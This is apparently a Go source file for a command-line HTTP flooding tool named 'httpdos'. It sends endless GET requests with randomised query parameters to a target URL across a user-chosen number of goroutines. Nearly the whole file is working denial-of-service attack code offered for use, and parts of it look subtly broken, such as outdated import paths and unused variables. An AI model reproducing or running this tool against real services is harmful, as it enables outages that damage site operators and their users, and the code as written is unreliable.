package main

import (
    "os"
    "strconv"
    "regexp"
    "http"
    "rand"
    "fmt"
)

func flood(target string) {
    // Http flooding with random url parameter

    for {
        url := fmt.Sprintf(target, rand.Intn(9999999) + 100)
        resp, err := http.Get(url)
        fmt.Println(url)
    }
}

func errno(no int) {
    // Print error message by code and close program

    var err string

    switch no {
        case 1:
            err = "Internal program error"
        case 2:
            err = "Usage: httpdos [url] [threads]"
        case 3:
            err = "Incorrect url value for first argument"
        case 4:
            err = "Incorrect integer value for second argument"
    }

    fmt.Println(err)
    os.Exit(no)
}

func url_is_valid(url string) bool {
   /*
    * Checking for correct url. Returns true if url-address is match
    * for regular expression. And false, if url don't match
   */

   match, err := regexp.MatchString("^(http?|https):\\/\\/.+%d+", url) 

   if match && err == nil {
        return true
   }
   return false
}

func main() {
    // At least tho arguments required
    if len(os.Args) > 2 {
        target := os.Args[1]

        // If url of target's not valid
        if !url_is_valid(target) {
            // Raise errno
            errno(3)
        }

        // Setting count of threads for setup connection
        threads, err := strconv.Atoi(os.Args[2])
        
        // If this value is not integer, raise errno
        if err != nil {
            errno(4)
        }

        // Create threads
        for i := 0; i < threads; i++ {
            go flood(target)
        }

        // Flooding
        flood(target)
    } else {
        // Too few arguments 
        errno(2)
    }
}
